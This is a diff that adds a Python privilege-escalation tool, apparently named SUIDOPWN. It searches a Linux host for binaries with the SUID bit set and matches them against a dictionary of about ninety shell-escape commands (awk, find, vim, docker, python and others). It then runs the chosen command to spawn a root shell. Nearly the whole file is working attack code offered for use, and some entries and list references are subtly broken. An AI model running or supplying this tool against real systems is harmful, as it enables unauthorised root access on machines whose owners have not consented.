@@ -1,0 +1,200 @@
+#!/bin/python3
+
+import subprocess, os, time
+
+def blue(skk):
+    print("\033[96m{}\033[00m".format(skk))
+def red(skk):
+    print("\033[91m{}\033[00m".format(skk))
+def green(skk):
+    print("\033[92m{}\033[00m".format(skk))
+def yellow(skk):
+    print("\033[93m{}\033[00m".format(skk))
+def purple(skk): 
+    print("\033[95m {}\033[00m" .format(skk))
+
+#Dictionary of all binaries, and the commands used to  exploit them.
+master = {
+        'awk' : """awk 'BEGIN {system("/bin/sh")}'""",
+        'bash' : """bash -p""",
+        'busybox' : """sh """,
+        'capsh' : """capsh --gid=0 --uid=0 --""",
+        'choom' : """choom -n 0 -- /bin/sh -p""",
+        'cpulimit' : """cpulimit -l 100 -f -- /bin/sh -p""",
+        'csh' : """csh -b""",
+        'dash' : """dash -p""",
+        'ash' : """ash -p""",
+        'aa-exec' : """aa-exec /bin/sh -p""",
+        'csvtool' : """csvtool call '/bin/sh;false' /etc/passwd""",
+        'debugfs' : """debugfs \n!/bin/sh""",
+        'distcc' : """distcc /bin/sh -p""",
+        'docker' : """docker run -v /:/mnt --rm -it alpine chroot /mnt sh""",
+        'ed' : """ed\n!/bin/sh""",
+        'elvish' : """elvish""",
+        'cpio' : """echo '/bin/sh </dev/tty >/dev/tty' >localhost;cpio -o --rsh-command /bin/sh -F localhost:""",
+        'emacs' : """emacs -Q -nw --eval '(term "/bin/sh")'""",
+        'env' : """env /bin/sh -p""",
+        'expect' : """expect -c 'spawn /bin/sh -p;interact'""",
+        'find' : """find . -exec /bin/sh -p \; -quit""",
+        'fish' : """fish""",
+        'flock' : """flock -u / /bin/sh -p""",
+        'gawk' : """gawk 'BEGIN {system("/bin/sh")}'""",
+        'gdb' : """gdb -nx -ex '!sh' -ex quit""",
+        'genie' : """genie -c '/bin/sh'""",
+        'gimp' : """gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system("sh")'""",
+        'gtester' : """TF=$(mktemp);echo '#!/bin/sh' > $TF;echo 'exec /bin/sh -p 0<&1' >> $TF;chmod +x $TF;gtester -q $TF""",
+        'hping3' : """hping3;/bin/sh -p""",
+        'ionice' : """ionice /bin/sh -p""",
+        'ispell' : """ispell /etc/passwd;!/bin/sh -p""",
+        'jjs' : """echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()" | jjs""",
+        'jrunscript' : """jrunscript -e 'exec("/bin/sh -pc \$@|sh\$IFS-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)")'""",
+        'julia' : """julia -e 'run("/bin/sh -p")'""",
+        'ksh' : """ksh -p""",
+        'ld.so' : """ld.so /bin/sh -p""",
+        'less' : """less /etc/profile\n!/bin/sh""",
+        'logsave' : """logsave /dev/null /bin/sh -i -p""",
+        'lua' : """lua -e 'os.execute("/bin/sh")'""",
+        'make' : """COMMAND='/bin/sh';make -s --eval=$'x:\n\t-'"$COMMAND"'""",
+        'mawk' : """mawk 'BEGIN {system("/bin/sh")}'""",
+        'more' : """more /etc/profile\n!/bin/sh""",
+        'msgfilter' : """echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2; kill $PPID'""",
+        'multitime' : """multitime /bin/sh -p""",
+        'nawk' : """nawk 'BEGIN {system("/bin/sh")}'""",
+        'ncftp' : """ncftp\n!/bin/sh -p""",
+        'nice' : """nice /bin/sh -p""",
+        'nmap' : """TF=$(mktemp);echo 'os.execute("/bin/sh")' > $TF;nmap --script=$TF""",
+        'node' : """node -e 'require("child_process").spawn("/bin/sh", stdio: [0, 1, 2])'""",
+        'nohup' : """nohup /bin/sh -p -c 'sh -p <$(tty) >$(tty) 2>$(tty)'""",
+        'openvpn' : """openvpn --dev null --script-security 2 --up '/bin/sh -c sh'""",
+        'perf' : """perf stat /bin/sh -p""",
+        'perl' : """perl -e 'exec "/bin/sh";'""",
+        'pexec' : """pexec /bin/sh -p""",
+        'pg' : """pg /etc/profile;!/bin/sh""",
+        'php' : """CMD="/bin/sh";php -r 'pcntl_exec("/bin/sh", ['-p']);'""",
+        'python' : """python -c 'import os; os.execl("/bin/sh", "sh", "-p")'""",
+        'rc' : """rc -c '/bin/sh -p'""",
+        'rlwrap' : """rlwrap -H /dev/null /bin/sh -p""",
+        'rsync' : """rsync -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null""",
+        'rtorrent' : """echo "execute = /bin/sh,-p,-c,\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"" >~/.rtorrent.rc;./rtorrent""",
+        'run-parts' : """run-parts --new-session --regex '^sh$' /bin --arg='-p'""",
+        'rview' : """rview -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'""",
+        'rvim' : """rvim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'""",
+        'sash' : """sash""",
+        'scanmem' : """scanmem\nshell /bin/sh""",
+        'sed' : """sed -n '1e exec sh 1>&0' /etc/hosts""",
+        'setarch' : """setarch $(arch) /bin/sh -p""",
+        'setlock' : """setlock - /bin/sh -p""",
+        'softlimit' : """softlimit /bin/sh -p""",
+        'sqlite3' : """sqlite3 /dev/null '.shell /bin/sh'""",
+        'ssh-agent' : """ssh-agent /bin/bash -p""",
+        'sshpass' : """sshpass /bin/sh -p""",
+        'start-stop-daemon' : """start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p""",
+        'stdbuf' : """stdbuf -i0 /bin/sh -p""",
+        'strace' : """strace -o /dev/null /bin/sh -p""",
+        'taskset' : """taskset 1 /bin/sh -p""",
+        'tclsh' : """tclsh;exec /bin/sh -p <@stdin >@stdout 2>@stderr""",
+        'time' : """time /bin/sh -p""",
+        'timeout' : """timeout 7d /bin/sh -p""",
+        'unshare' : """unshare -r /bin/sh""",
+        'vagrant' : """cd $(mktemp -d);echo 'exec "/bin/sh -p"' > Vagrantfile;vagrant up""",
+        'view' : """view -c ':!/bin/sh'""",
+        'vim' : """vim -c ':!/bin/sh'""",
+        'vimdiff' : """vimdiff -c ':!/bin/sh'""",
+        'watch' : """watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'""",
+        'wget' : """TF=$(mktemp);chmod +x $TF;echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF;wget --use-askpass=$TF 0""",
+        'xargs' : """xargs -a /dev/null sh -p""",
+        'xdotool' : """xdotool exec --sync /bin/sh -p""",
+        'yash' : """yash""",
+        'zsh' : """zsh""",
+        }
+
+roots = ['aa-exec', 'ash', 'bash', 'capsh', 'choom', 'cpulimit', 'csh', 'dash', 'distcc', 'docker', 'elvish', 'env', 'expect', 'find','fish', 'flock', 'gtester', 'ionice', 'jrunscript', 'logsave', 'ksh', 'multitime', 'ncftp', 'nice', 'nohup', 'perf','pexec', 'php', 'python', 'python3', 'rc', 'rlwrap', 'run-parts', 'strace', 'taskset', 'tclsh', 'time', 'timeout', 'unshare', 'vagrant', 'watch', 'wget', 'sash', 'setarch', 'setlock', 'softlimit', 'ssh-agent', 'sshpass', 'start-stop-daemon', 'stdbuf', 'xargs', 'yash', 'zsh']
+
+version_dependent = ['awk', 'busybox', 'csvtool', 'cpio', 'emacs', 'gawk', 'gdb', 'genie', 'gimp', 'ispell', 'julia', 'jjs','ld.so', 'lua', 'make', 'mawk', 'msgfilter', 'nawk','nmap',  'node', 'openvpn', 'perl', 'rsync', 'rtorrent', 'rview', 'rvim', 'sed', 'sqlite3', 'view', 'vim','vimdiff', 'xdotool',] 
+
+staged = ['debugfs', 'ed', 'hping3', 'less', 'more', 'pg', 'scanmem']
+
+#Finds all binaries with SUID bit set saves them to a list.
+
+bins = subprocess.run(["find","/usr/bin","/usr/sbin","/opt", "/home/","-type","f","-perm","-4000"], stdout=subprocess.PIPE,text=True)
+suid = bins.stdout.split()
+suid = [x.split("/")[-1] for x in suid]
+
+#Compares suid list items to items in roots dict, and creates a list of vulnerable binaries installed on the target. 
+possible_vulns = [x for x in suid if x in master.keys()]
+vulns = sorted([x for x in possible_vulns if x in roots])
+dependent = sorted([x for x in possible_vulns if x in version_dependent])
+staged_vuln = sorted([x for x in possible_vulns if x in staged])
+found_vulns = vulns + dependent + staged
+#Step 1: Prints all vulnerable binaries, and allows you to choose which one you want to exploit, or lets you search for a specific binary.
+
+#Step 2: If choosing vulnerable binary, you will automatically exploit the bin and be dropped into a root shell. If searching for a binary and it is found to be vulnerable on the system, the exploited command will be printed to the screen, and you will be prompted if you would like to automatically exploit the binary or not. If yes, you will be dropped into a root shell, if not, then you will be exited from the script. 
+
+
+def get_exploit():
+    os.system("clear")
+    blue("""
+  _____ _    _ _____ _____   ____  _______          ___   _ 
+ / ____| |  | |_   _|  __ \ / __ \|  __ \ \        / / \ | |
+| (___ | |  | | | | | |  | | |  | | |__) \ \  /\  / /|  \| |
+ \___ \| |  | | | | | |  | | |  | |  ___/ \ \/  \/ / | .   |
+ ____) | |__| |_| |_| |__| | |__| | |      \  /\  /  | |\  |
+|_____/ \____/|_____|_____/ \____/|_|       \/  \/   |_| \_|
+    """)
+    i = 1
+    print("\n\n  Found Vulnerable SUID Binaries:\n")
+    for vuln in vulns:
+        green("  " + str(i) + ") " + str.title(vuln))
+        i += 1
+        time.sleep(.1)
+    print('\n\n  Following binaries are version dependent... Results may vary\n')
+    for vuln in dependent:
+        yellow("  " + str(i) + ') ' + str.title(vuln))
+        i += 1
+        time.sleep(.1)
+    print("\n\n  Following multi-stage binaries found:\n")
+    for vuln in staged_vuln:
+        red("  " + vuln)
+        time.sleep(.1)
+    print("\n  ***NOTE: Staged binaries can NOT be automatically exploited using SUIDOPWN. Use search function to see how to manually exploit...Results may vary...***\n")
+    purple("\n  0) Search For Specific Binary\n")
+    choice = input("\n\n  Exploit Selection: ")
+    if choice != "0":
+        return found_vulns[(int(choice) -1)]
+    else:
+        choice2 = str.lower(input("\nSearch for binary: "))
+        os.system('clear')
+        if choice2 in found_vulns:
+            green("  " + choice2 + " was found with SUID Bit set.")
+            print("\n  Run with:\n")
+            blue(master[choice2])
+            choice3 = str.lower(input("\n\n  Would you like to exploit Y/N: "))
+            if choice3 == 'n' or choice3 == 'no':
+                ("\n\n  Aborting...\n\n")
+                exit()
+            elif choice3 == 'y' or choice3 =='yes':
+                if choice2 not in staged_vuln:
+                    return choice2
+                else:
+                    red("\n\n  Multi-stage binaries can not be exploited automatically...Please exploit manually with command above...\n\n  Aborting...\n")
+                    exit()
+        elif choice2 not in possible_vulns and choice2 in master.keys():
+            red("\n\n  Binary is not installed or does not have SUID bit on this system...\n\n")
+            print("  To gain root access with binary with SUID bit set run:\n\n")
+            blue("  " + master[choice2])
+            red('\n\n  Exiting...\n')
+            exit()
+        else:
+            red("\n\n  Invalid Selection...\n\n  Binary Not Found or is not vulnerable...\n\n  Exiting...\n")
+            exit()
+
+def main():
+    exploit = get_exploit()
+    print("  Exploiting " + exploit + "...\n")
+    os.system(master[exploit])
+    print("\n")
+    exit()
+
+main()
+
+
